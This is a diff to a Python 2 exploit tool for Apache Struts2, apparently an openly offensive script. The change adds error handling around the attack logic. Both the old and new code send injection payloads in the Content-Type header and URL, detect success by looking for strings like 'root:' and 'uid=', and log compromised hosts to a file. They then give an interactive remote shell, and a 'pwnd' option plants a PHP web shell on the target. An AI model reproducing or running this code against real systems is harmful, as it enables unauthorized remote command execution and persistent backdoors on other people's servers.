@@ -122,32 +122,35 @@ if len(host) > 0:
 		x = 0
 		while x < len(validador()):
 			valida = validador()[x]
-			req = urllib2.Request(host, None, {'User-Agent': 'Mozilla/5.0', 'Content-Type': exploit2(str(valida))})
-			result = urllib2.urlopen(req).read()
 
-		  	if result.find("ASCII") != -1 or result.find("No such") != -1 or result.find("Directory of") != -1 or result.find("Volume Serial") != -1 or result.find("inet") != -1 or result.find("root:") != -1 or result.find("uid=") != -1 or result.find("accounts") != -1 or result.find("Cuentas") != -1:
-		  		print RED+"   [-] VULNERABLE"+ENDC
-		  		owned = open('vulnsite.txt', 'a')
-				owned.write(str(host)+'\n')
-				owned.close()
+			try:
+				req = urllib2.Request(host, None, {'User-Agent': 'Mozilla/5.0', 'Content-Type': exploit2(str(valida))})
+				result = urllib2.urlopen(req).read()
 
-				opcion = raw_input(YELLOW+"   [-] RUN THIS EXPLOIT (s/n): "+ENDC)
-				if opcion == 's':
-					print YELLOW+"   [-] GET PROMPT...\n"+ENDC
-					time.sleep(1)
+			  	if result.find("ASCII") != -1 or result.find("No such") != -1 or result.find("Directory of") != -1 or result.find("Volume Serial") != -1 or result.find("inet") != -1 or result.find("root:") != -1 or result.find("uid=") != -1 or result.find("accounts") != -1 or result.find("Cuentas") != -1:
+			  		print RED+"   [-] VULNERABLE"+ENDC
+			  		owned = open('vulnsite.txt', 'a')
+					owned.write(str(host)+'\n')
+					owned.close()
 
-				  	while 1:
-						try:
-							separador = raw_input(GREEN+"\nStruts2@Shell_2:$ "+ENDC)
-							req = urllib2.Request(host, None, {'User-Agent': 'Mozilla/5.0', 'Content-Type': exploit2(str(separador))})
-							result = urllib2.urlopen(req).read()
-							print "\n"+result
-						except:
-							exit(0)
+					opcion = raw_input(YELLOW+"   [-] RUN THIS EXPLOIT (s/n): "+ENDC)
+					if opcion == 's':
+						print YELLOW+"   [-] GET PROMPT...\n"+ENDC
+						time.sleep(1)
+
+					  	while 1:
+							try:
+								separador = raw_input(GREEN+"\nStruts2@Shell_2:$ "+ENDC)
+								req = urllib2.Request(host, None, {'User-Agent': 'Mozilla/5.0', 'Content-Type': exploit2(str(separador))})
+								result = urllib2.urlopen(req).read()
+								print "\n"+result
+							except:
+								exit(0)
+					else:
+						x = len(validador())
 				else:
-					x = len(validador())
-			else:
-				print BLUE+"     [-] NO VULNERABLE "+ENDC + "Payload: " + str(x)
+					print BLUE+"     [-] NO VULNERABLE "+ENDC + "Payload: " + str(x)
+			except:
 				pass
 			x=x+1
 
@@ -169,46 +172,48 @@ if len(host) > 0:
 			if (file_path == ''):
 				file_path = '/'
 			
-			valida = validador()[x]	
-			result = requests.get(site+"/"+exploit3(str(valida))+file_path).text
+			valida = validador()[x]
+			try:	
+				result = requests.get(site+"/"+exploit3(str(valida))+file_path).text
 
-			if result.find("ASCII") != -1 or result.find("No such") != -1 or result.find("Directory of") != -1 or result.find("Volume Serial") != -1 or result.find("inet") != -1 or result.find("root:") != -1 or result.find("uid=") != -1 or result.find("accounts") != -1 or result.find("Cuentas") != -1:
-		  		print RED+"   [-] VULNERABLE"+ENDC
-		  		owned = open('vulnsite.txt', 'a')
-				owned.write(str(host)+'\n')
-				owned.close()
+				if result.find("ASCII") != -1 or result.find("No such") != -1 or result.find("Directory of") != -1 or result.find("Volume Serial") != -1 or result.find("inet") != -1 or result.find("root:") != -1 or result.find("uid=") != -1 or result.find("accounts") != -1 or result.find("Cuentas") != -1:
+			  		print RED+"   [-] VULNERABLE"+ENDC
+			  		owned = open('vulnsite.txt', 'a')
+					owned.write(str(host)+'\n')
+					owned.close()
 
-				opcion = raw_input(YELLOW+"   [-] RUN THIS EXPLOIT (s/n): "+ENDC)
-				if opcion == 's':
-					print YELLOW+"   [-] GET PROMPT...\n"+ENDC
-					time.sleep(1)
-					print BOLD+"   * [UPLOAD SHELL]"+ENDC
-					print OTRO+"     Struts@Shell:$ pwnd (php)\n"+ENDC
+					opcion = raw_input(YELLOW+"   [-] RUN THIS EXPLOIT (s/n): "+ENDC)
+					if opcion == 's':
+						print YELLOW+"   [-] GET PROMPT...\n"+ENDC
+						time.sleep(1)
+						print BOLD+"   * [UPLOAD SHELL]"+ENDC
+						print OTRO+"     Struts@Shell:$ pwnd (php)\n"+ENDC
 
-				  	while 1:
-						separador = raw_input(GREEN+"Struts2@Shell_3:$ "+ENDC)
-						espacio = separador.split(' ')
-						comando = "%20".join(espacio)
+					  	while 1:
+							separador = raw_input(GREEN+"Struts2@Shell_3:$ "+ENDC)
+							espacio = separador.split(' ')
+							comando = "%20".join(espacio)
 
-						if espacio[0] != 'reverse' and espacio[0] != 'pwnd':
-							shell = urllib2.urlopen(host+exploit3(str(comando)))
-							print "\n"+shell.read()
-						elif espacio[0] == 'pwnd':
-							pathsave=raw_input("path EJ:/tmp/: ")
+							if espacio[0] != 'reverse' and espacio[0] != 'pwnd':
+								shell = urllib2.urlopen(host+exploit3(str(comando)))
+								print "\n"+shell.read()
+							elif espacio[0] == 'pwnd':
+								pathsave=raw_input("path EJ:/tmp/: ")
 
-							if espacio[1] == 'php':
-								shellfile = """'python','-c','f%3dopen("/tmp/status.php","w");f.write("<?php%20system($_GET[ksujenenuhw])?>")'"""
-								urllib2.urlopen(host+pwnd(str(shellfile)))
-								shell = urllib2.urlopen(host+exploit3("'ls','-l','"+pathsave+"status.php'"))
-								if shell.read().find(pathsave+"status.php") != -1:
-									print BOLD+GREEN+"\nCreate File Successfull :) ["+pathsave+"status.php]\n"+ENDC
-								else:
-									print BOLD+RED+"\nNo Create File :/\n"+ENDC
+								if espacio[1] == 'php':
+									shellfile = """'python','-c','f%3dopen("/tmp/status.php","w");f.write("<?php%20system($_GET[ksujenenuhw])?>")'"""
+									urllib2.urlopen(host+pwnd(str(shellfile)))
+									shell = urllib2.urlopen(host+exploit3("'ls','-l','"+pathsave+"status.php'"))
+									if shell.read().find(pathsave+"status.php") != -1:
+										print BOLD+GREEN+"\nCreate File Successfull :) ["+pathsave+"status.php]\n"+ENDC
+									else:
+										print BOLD+RED+"\nNo Create File :/\n"+ENDC
+					else:
+						x = len(validador())
+						exit(0)
 				else:
-					x = len(validador())
-					exit(0)
-			else:
-				print BLUE+"     [-] NO VULNERABLE "+ENDC + "Payload: " + str(x)
+					print BLUE+"     [-] NO VULNERABLE "+ENDC + "Payload: " + str(x)
+			except:
 				pass
 			x=x+1
 	else:
